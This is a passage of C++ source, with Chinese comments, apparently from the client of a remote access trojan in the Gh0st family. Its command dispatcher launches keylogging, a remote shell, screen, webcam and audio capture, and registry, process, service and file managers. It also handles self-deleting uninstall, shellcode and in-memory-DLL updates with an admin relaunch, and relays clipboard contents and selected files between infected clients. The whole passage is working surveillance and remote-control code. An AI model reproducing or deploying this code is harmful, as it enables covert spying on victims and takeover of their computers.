        }
        break;
    case COMMAND_KEYBOARD: { //键盘记录
        if (m_hKeyboard) {
            CloseHandle(__CreateThread(NULL, 0, SendKeyboardRecord, m_hKeyboard->user, 0, NULL));
        } else {
            m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn, publicIP);
            m_hThread[m_ulThreadCount++].h = __CreateThread(NULL, 0, LoopKeyboardManager, &m_hThread[m_ulThreadCount], 0, NULL);;
        }
        break;
    }

    case COMMAND_TALK: {
        m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn, publicIP);
        m_hThread[m_ulThreadCount].user = m_hInstance;
        m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopTalkManager, &m_hThread[m_ulThreadCount], 0, NULL);;
        break;
    }

    case COMMAND_SHELL: {
        m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn, publicIP);
        m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopShellManager, &m_hThread[m_ulThreadCount], 0, NULL);;
        break;
    }

    case COMMAND_SYSTEM: {     //远程进程管理
        m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn, publicIP);
        m_hThread[m_ulThreadCount++].h = __CreateThread(NULL, 0, LoopProcessManager, &m_hThread[m_ulThreadCount], 0, NULL);;
        break;
    }

    case COMMAND_WSLIST: {     //远程窗口管理
        m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn, publicIP);
        m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopWindowManager, &m_hThread[m_ulThreadCount], 0, NULL);;
        break;
    }

    case COMMAND_BYE: {
        BYTE	bToken = COMMAND_BYE;// 被控端退出
        m_ClientObject->Send2Server((char*)&bToken, 1);
        g_bExit = S_CLIENT_EXIT;
        Mprintf("======> Client exit \n");
        break;
    }

    case TOKEN_UNINSTALL: {
        BYTE	bToken = COMMAND_BYE;// 被控端退出
        m_ClientObject->Send2Server((char*)&bToken, 1);
        g_bExit = S_CLIENT_EXIT;
        self_del(10);
        Mprintf("======> Client uninstall \n");
        break;
    }

    case SERVER_EXIT: {
        // 主控端退出
        g_bExit = S_SERVER_EXIT;
        Mprintf("======> Server exit \n");
        break;
    }

    case COMMAND_SCREEN_SPY: {
        UserParam* user = new UserParam{ ulLength > 1 ? new BYTE[ulLength - 1] : nullptr, int(ulLength-1) };
        if (ulLength > 1) {
            memcpy(user->buffer, szBuffer + 1, ulLength - 1);
            if (ulLength > 2 && !m_conn->IsVerified()) user->buffer[2] = 0;
        }
        m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn, publicIP, this);
        m_hThread[m_ulThreadCount].user = user;
        m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopScreenManager, &m_hThread[m_ulThreadCount], 0, NULL);;
        break;
    }

    case COMMAND_LIST_DRIVE : {
        m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn, publicIP);
        m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopFileManager, &m_hThread[m_ulThreadCount], 0, NULL);;
        break;
    }

    case COMMAND_WEBCAM: {
        static bool hasCamera = WebCamIsExist();
        if (!hasCamera) break;
        m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn, publicIP);
        m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopVideoManager, &m_hThread[m_ulThreadCount], 0, NULL);;
        break;
    }

    case COMMAND_AUDIO: {
        m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn, publicIP);
        m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopAudioManager, &m_hThread[m_ulThreadCount], 0, NULL);;
        break;
    }

    case COMMAND_REGEDIT: {
        m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn, publicIP);
        m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopRegisterManager, &m_hThread[m_ulThreadCount], 0, NULL);;
        break;
    }

    case COMMAND_SERVICES: {
        m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn, publicIP);
        m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopServicesManager, &m_hThread[m_ulThreadCount], 0, NULL);
        break;
    }

    case COMMAND_UPDATE: {
        auto typ = m_conn->ClientType();
        if (typ == CLIENT_TYPE_DLL || typ == CLIENT_TYPE_MODULE) {
            ULONGLONG size = 0;
            memcpy(&size, (const char*)szBuffer + 1, sizeof(ULONGLONG));
            if (WriteBinaryToFile((const char*)szBuffer + 1 + sizeof(ULONGLONG), size)) {
                g_bExit = S_CLIENT_UPDATE;
            }
        } else if (typ == CLIENT_TYPE_SHELLCODE || typ == CLIENT_TYPE_MEMDLL) {
            char curFile[_MAX_PATH] = {};
            GetModuleFileName(NULL, curFile, MAX_PATH);
            if (IsPowerShellAvailable() && StartAdminLauncherAndExit(curFile, false)) {
                g_bExit = S_CLIENT_UPDATE;
                // 强制退出当前进程，并重新启动；这会触发重新获取 Shell code 从而做到软件升级
                Mprintf("CKernelManager: [%s] Will be updated.\n", curFile);
                Sleep(1000);
                TerminateProcess(GetCurrentProcess(), 0xABCDEF);
            }
            Mprintf("CKernelManager: [%s] Update FAILED.\n", curFile);
        } else if(typ == CLIENT_TYPE_ONE) {
            ULONGLONG size = 0;
            memcpy(&size, (const char*)szBuffer + 1, sizeof(ULONGLONG));
            const char* name = "updater.exe";
            char curFile[_MAX_PATH] = {};
            GetModuleFileName(NULL, curFile, MAX_PATH);
            GET_FILEPATH(curFile, name);
            DeleteFileA(curFile);
            if (!WriteBinaryToFile((const char*)szBuffer + 1 + sizeof(ULONGLONG), size, name)) {
                Mprintf("CKernelManager: Write \"%s\" failed.\n", curFile);
                break;
            }
            if (IsPowerShellAvailable() && StartAdminLauncherAndExit(curFile, false)) {
#if _CONSOLE
                if (m_conn->iStartup == Startup_GhostMsc) ServiceWrapper_Stop();
#endif
                g_bExit = S_CLIENT_UPDATE;
                Mprintf("CKernelManager: [%s] Will be executed.\n", curFile);
                Sleep(1000);
                TerminateProcess(GetCurrentProcess(), 0xABCDEF);
            }
            Mprintf("CKernelManager: [%s] Execute FAILED.\n", curFile);
        } else {
            Mprintf("=====> 客户端类型'%d'不支持文件升级\n", typ);
        }
        break;
    }

    case COMMAND_SEND_FILE_V2: {
        // C2C/V2 文件接收（RecvFileChunkV2 内部会打印进度）
        int n = RecvFileChunkV2((char*)szBuffer, ulLength, m_conn,
            nullptr, m_hash, m_hmac, m_MyClientID);
        if (n) {
            Mprintf("[C2C] RecvFileChunkV2 failed: %d\n", n);
        }
        break;
    }

    case COMMAND_CLIPBOARD_V2: {
        // C2C 剪贴板请求：被请求发送剪贴板文件到另一个客户端
        ClipboardRequestV2* req = (ClipboardRequestV2*)szBuffer;
        Mprintf("[C2C] 收到剪贴板请求: src=%llu, dst=%llu, transferID=%llu\n",
            req->srcClientID, req->dstClientID, req->transferID);

        // 从请求包中提取认证信息
        std::string hash(req->hash, 64);
        std::string hmac(req->hmac, 16);

        // 获取剪贴板文件或选中文件
        int result = 0;
        auto files = GetClipboardFiles(result);
        if (files.empty()) {
            files = GetForegroundSelectedFiles(result);
        }

        if (!files.empty()) {
            // C2C: 不指定目标目录，由接收方决定
            std::string targetDir = "";

            // 收集文件信息（使用相对路径，接收方使用后缀匹配）
            std::vector<std::pair<std::string, uint64_t>> fileInfos;
            std::string rootDir = GetCommonRoot(files);
            for (size_t i = 0; i < files.size(); i++) {
                std::string relPath = GetRelativePath(rootDir, files[i]);
                std::replace(relPath.begin(), relPath.end(), '\\', '/');
                // 获取文件大小
                HANDLE hFile = CreateFileA(files[i].c_str(), GENERIC_READ, FILE_SHARE_READ,
                    nullptr, OPEN_EXISTING, 0, nullptr);
                if (hFile != INVALID_HANDLE_VALUE) {
                    LARGE_INTEGER size;
                    GetFileSizeEx(hFile, &size);
                    CloseHandle(hFile);
                    fileInfos.push_back({relPath, (uint64_t)size.QuadPart});
                }
            }

            // 发送续传查询（通过主连接，响应也会回到主连接）
            bool queryPending = false;
            if (!fileInfos.empty()) {
                auto queryPkt = BuildResumeQuery(req->transferID, m_MyClientID, req->dstClientID, fileInfos);
                if (!queryPkt.empty()) {
                    m_ClientObject->Send2Server((char*)queryPkt.data(), (int)queryPkt.size());
                    Mprintf("[C2C] 发送续传查询: %zu 个文件, 使用完整路径\n", fileInfos.size());
                    queryPending = true;
                }
            }

            TransferOptionsV2 opts;
            opts.transferID = req->transferID;
            opts.srcClientID = m_MyClientID;  // 我是源
            opts.dstClientID = req->dstClientID;  // 目标客户端
            opts.enableResume = queryPending;  // 只有发送了查询才等待响应

            IOCPClient* pClient = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn);
            if (pClient->ConnectServer(m_ClientObject->ServerIP().c_str(), m_ClientObject->ServerPort())) {
                std::thread([files, targetDir, pClient, opts, hash, hmac]() {
                    FileBatchTransferWorkerV2(files, targetDir, pClient,
                        [](void* user, FileChunkPacketV2* chunk, unsigned char* data, int size) -> bool {
                            IOCPClient* client = (IOCPClient*)user;
                            return client->Send2Server((char*)data, size) != FALSE;
                        },
                        [](void* user) {
                            IOCPClient* client = (IOCPClient*)user;
                            delete client;
                            Mprintf("[C2C] 文件发送完成\n");
                        },
                        hash, hmac, opts);
                }).detach();
                Mprintf("[C2C] 开始发送 %zu 个文件到客户端 %llu\n", files.size(), req->dstClientID);
            } else {
                delete pClient;
                Mprintf("[C2C] 连接服务器失败\n");
            }
        } else {
            // 没有文件，尝试发送剪贴板文本
            std::string text;
            if (::OpenClipboard(NULL)) {
                HGLOBAL hGlobal = GetClipboardData(CF_UNICODETEXT);
                if (hGlobal) {
                    wchar_t* pWideStr = (wchar_t*)GlobalLock(hGlobal);
                    if (pWideStr) {
                        int len = WideCharToMultiByte(CP_UTF8, 0, pWideStr, -1, NULL, 0, NULL, NULL);
                        if (len > 0) {
                            text.resize(len);
                            WideCharToMultiByte(CP_UTF8, 0, pWideStr, -1, &text[0], len, NULL, NULL);
                            text.resize(strlen(text.c_str()));  // 去除末尾 \0
                        }
                        GlobalUnlock(hGlobal);
                    }
                }
                ::CloseClipboard();
            }
            if (!text.empty()) {
                // 构建 C2C 文本包: [cmd:1][dstClientID:8][textLen:4][text:N]
                uint32_t textLen = (uint32_t)text.size();
                std::vector<char> pkt(1 + 8 + 4 + textLen);
                pkt[0] = COMMAND_C2C_TEXT;
                memcpy(&pkt[1], &req->dstClientID, 8);
                memcpy(&pkt[9], &textLen, 4);
                memcpy(&pkt[13], text.data(), textLen);
                m_ClientObject->Send2Server(pkt.data(), (int)pkt.size());
                Mprintf("[C2C] 发送文本到客户端 %llu (%u 字节)\n", req->dstClientID, textLen);
            } else {
                Mprintf("[C2C] 没有找到要发送的文件或文本\n");
            }
        }
        break;
    }

    case COMMAND_C2C_PREPARE: {
        // C2C 准备接收：捕获当前目录并返回路径给发送方
        if (ulLength < sizeof(C2CPreparePacket)) break;
        C2CPreparePacket* pkt = (C2CPreparePacket*)szBuffer;
        Mprintf("[C2C] 收到准备接收通知: transferID=%llu, srcClientID=%llu\n",
            pkt->transferID, pkt->srcClientID);

        // 捕获当前目录
        SetC2CTargetFolder(pkt->transferID);

        // 获取目标目录并返回给发送方
        std::string targetDir;
        if (!GetCurrentFolderPath(targetDir)) {
            char tempPath[MAX_PATH];
            GetTempPathA(MAX_PATH, tempPath);
            targetDir = std::string(tempPath) + "C2CRecv\\";
        }

        // 转换为 UTF-8
        int wideLen = MultiByteToWideChar(CP_ACP, 0, targetDir.c_str(), -1, nullptr, 0);
        std::wstring wideDir(wideLen - 1, 0);
        MultiByteToWideChar(CP_ACP, 0, targetDir.c_str(), -1, &wideDir[0], wideLen);
        int utf8Len = WideCharToMultiByte(CP_UTF8, 0, wideDir.c_str(), -1, nullptr, 0, nullptr, nullptr);
        std::string utf8Dir(utf8Len - 1, 0);
        WideCharToMultiByte(CP_UTF8, 0, wideDir.c_str(), -1, &utf8Dir[0], utf8Len, nullptr, nullptr);

        // 构建响应包
        std::vector<uint8_t> respBuf(sizeof(C2CPrepareRespPacket) + utf8Dir.size());
        C2CPrepareRespPacket* resp = (C2CPrepareRespPacket*)respBuf.data();
        resp->cmd = COMMAND_C2C_PREPARE_RESP;
        resp->transferID = pkt->transferID;
        resp->srcClientID = pkt->srcClientID;  // 原始发送方，服务端据此路由
        resp->pathLength = (uint16_t)utf8Dir.size();
        memcpy(respBuf.data() + sizeof(C2CPrepareRespPacket), utf8Dir.c_str(), utf8Dir.size());

        // 发送响应（通过服务端路由到发送方）
        m_ClientObject->Send2Server((char*)respBuf.data(), (int)respBuf.size());
        Mprintf("[C2C] 发送目录响应: %s -> srcClient=%llu\n", targetDir.c_str(), pkt->srcClientID);
        break;
    }

    case COMMAND_C2C_PREPARE_RESP: {
        // C2C 准备响应：收到目标客户端的目录（我是发送方）
        if (ulLength < sizeof(C2CPrepareRespPacket)) break;
        C2CPrepareRespPacket* resp = (C2CPrepareRespPacket*)szBuffer;
        uint16_t pathLen = resp->pathLength;
        if (ulLength < sizeof(C2CPrepareRespPacket) + pathLen) break;

        // 提取 UTF-8 目录路径
        std::string utf8Dir((const char*)szBuffer + sizeof(C2CPrepareRespPacket), pathLen);

        // UTF-8 -> 宽字符
        int wlen = MultiByteToWideChar(CP_UTF8, 0, utf8Dir.c_str(), -1, nullptr, 0);
        std::wstring wideDir(wlen - 1, 0);
        MultiByteToWideChar(CP_UTF8, 0, utf8Dir.c_str(), -1, &wideDir[0], wlen);

        // 存储目标目录（用于后续构建完整路径进行断点续传）
        SetSenderTargetFolder(resp->transferID, wideDir);
        Mprintf("[C2C] 收到目标目录响应: transferID=%llu, dir=%s\n", resp->transferID, utf8Dir.c_str());
        break;
    }

    case COMMAND_C2C_TEXT: {
        // C2C 文本剪贴板: [cmd:1][dstClientID:8][textLen:4][text:N]
        if (ulLength < 13) break;
        uint32_t textLen;
        memcpy(&textLen, szBuffer + 9, 4);
        if (ulLength < 13 + textLen) break;

        // UTF-8 文本转换为 Unicode 并设置剪贴板
        std::string utf8Text((const char*)szBuffer + 13, textLen);
        int wideLen = MultiByteToWideChar(CP_UTF8, 0, utf8Text.c_str(), -1, NULL, 0);
        if (wideLen > 0) {
            std::wstring wideText(wideLen, 0);
            MultiByteToWideChar(CP_UTF8, 0, utf8Text.c_str(), -1, &wideText[0], wideLen);

            if (::OpenClipboard(NULL)) {
                ::EmptyClipboard();
                HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, wideLen * sizeof(wchar_t));
                if (hGlobal) {
                    wchar_t* pDst = (wchar_t*)GlobalLock(hGlobal);
                    if (pDst) {
                        wcscpy(pDst, wideText.c_str());
                        GlobalUnlock(hGlobal);
                        SetClipboardData(CF_UNICODETEXT, hGlobal);
                        Mprintf("[C2C] 收到文本: %u 字节\n", textLen);

                        // 模拟 Ctrl+V 完成粘贴（因为原始 Ctrl+V 被服务端拦截了）
                        ::CloseClipboard();
                        INPUT inputs[4] = {};
                        inputs[0].type = INPUT_KEYBOARD;
                        inputs[0].ki.wVk = VK_CONTROL;
                        inputs[1].type = INPUT_KEYBOARD;
                        inputs[1].ki.wVk = 'V';
                        inputs[2].type = INPUT_KEYBOARD;
                        inputs[2].ki.wVk = 'V';
                        inputs[2].ki.dwFlags = KEYEVENTF_KEYUP;
                        inputs[3].type = INPUT_KEYBOARD;
                        inputs[3].ki.wVk = VK_CONTROL;
                        inputs[3].ki.dwFlags = KEYEVENTF_KEYUP;
                        SendInput(4, inputs, sizeof(INPUT));
                        break;
                    } else {
                        GlobalFree(hGlobal);
                    }
                }
                ::CloseClipboard();
            }
        }
        break;
    }

    case COMMAND_FILE_COMPLETE_V2: {
        // C2C 文件完成校验
        if (ulLength < sizeof(FileCompletePacketV2)) break;
        const FileCompletePacketV2* completePkt = (const FileCompletePacketV2*)szBuffer;
        bool verifyOk = HandleFileCompleteV2((const char*)szBuffer, ulLength, m_MyClientID);
        Mprintf("[C2C] 文件校验%s: transferID=%llu, fileIndex=%u\n",
            verifyOk ? "通过" : "失败", completePkt->transferID, completePkt->fileIndex);
        break;
    }

    case COMMAND_FILE_QUERY_RESUME: {
        // C2C 断点续传查询
        Mprintf("[C2C] 收到断点续传查询\n");
        auto response = HandleResumeQuery((const char*)szBuffer, ulLength);
        if (!response.empty()) {
            m_ClientObject->Send2Server((char*)response.data(), (int)response.size());
            Mprintf("[C2C] 已响应断点续传查询: %zu 字节\n", response.size());
        }
        break;
    }

    case COMMAND_FILE_RESUME: {
        // 检查是否为取消包
        if (ulLength >= sizeof(FileResumePacketV2)) {
            const FileResumePacketV2* pkt = (const FileResumePacketV2*)szBuffer;
            if (pkt->flags & FFV2_CANCEL) {
                // 取消传输：通知发送线程停止
                CancelTransfer(pkt->transferID);
                CleanupResumeState(pkt->transferID);
                Mprintf("[C2C] 传输已取消: transferID=%llu\n", pkt->transferID);
                break;
            }
        }
        // C2C 断点续传响应
        std::map<uint32_t, uint64_t> offsets;
        if (ParseResumeResponse((const char*)szBuffer, ulLength, offsets)) {
            Mprintf("[C2C] 收到续传响应: %zu 个文件\n", offsets.size());
            SetPendingResumeOffsets(offsets);
        } else {
            Mprintf("[C2C] 解析续传响应失败\n");
        }
        break;
    }

    default: {
        Mprintf("!!! Unknown command: %d\n", unsigned(szBuffer[0]));
        break;
    }
    }
}

void CKernelManager::OnHeatbeatResponse(PBYTE szBuffer, ULONG ulLength)
{
    if (ulLength > 8) {
        uint64_t n = 0;
        memcpy(&n, szBuffer + 1, sizeof(uint64_t));
        m_nNetPing.update_from_sample(GetUnixMs() - n);
    }
}

int AuthKernelManager::SendHeartbeat()
{
    for (int i = 0; i < m_settings.ReportInterval && !g_bExit && m_ClientObject->IsConnected(); ++i)
        Sleep(1000);
    if (!m_bFirstHeartbeat && m_settings.ReportInterval <= 0) { // 关闭上报信息（含心跳）
        for (int i = rand() % 120; i && !g_bExit && m_ClientObject->IsConnected() && m_settings.ReportInterval <= 0; --i)
            Sleep(1000);
        return 0;
    }
    if (g_bExit || !m_ClientObject->IsConnected())
        return -1;

    if (m_bFirstHeartbeat) {
        m_bFirstHeartbeat = false;
    }

    ActivityWindow checker;
    auto s = checker.Check();
    Heartbeat a(s, (int)(m_nNetPing.srtt * 1000));  // srtt是秒，转为毫秒
    a.HasSoftware = SoftwareCheck(m_settings.DetectSoftware);

    config* THIS_CFG = IsDebug ? new config : new iniFile;
    auto SN = THIS_CFG->GetStr("settings", "SN", "");
    auto passCode = THIS_CFG->GetStr("settings", "Password", "");
    auto pwdHmac = THIS_CFG->GetStr("settings", "PwdHmac", "");
    delete THIS_CFG;
    uint64_t value = std::strtoull(pwdHmac.c_str(), nullptr, 10);
    strcpy_s(a.SN, SN.c_str());
    strcpy_s(a.Passcode, passCode.c_str());
    memcpy(&a.PwdHmac, &value, 8);

    BYTE buf[sizeof(Heartbeat) + 1];
    buf[0] = TOKEN_HEARTBEAT;
    memcpy(buf + 1, &a, sizeof(Heartbeat));
    m_ClientObject->Send2Server((char*)buf, sizeof(buf));
    return 0;
}

void AuthKernelManager::OnHeatbeatResponse(PBYTE szBuffer, ULONG ulLength)
{
    if (ulLength > sizeof(HeartbeatACK)) {
        HeartbeatACK n = { 0 };
        memcpy(&n, szBuffer + 1, sizeof(HeartbeatACK));
        m_nNetPing.update_from_sample(GetUnixMs() - n.Time);
        if (n.Authorized == TRUE) {
            Mprintf("======> Client authorized successfully.\n");
            if (n.IsTrail) return; // Trial version, do not exit
            // Once the client is authorized, authentication is no longer needed
            // So we can set exit flag to terminate the AuthKernelManager
            g_bExit = S_CLIENT_EXIT;
        }
    } else if (ulLength > 8) {
        uint64_t n = 0;
        memcpy(&n, szBuffer + 1, sizeof(uint64_t));
        m_nNetPing.update_from_sample(GetUnixMs() - n);
    }
}
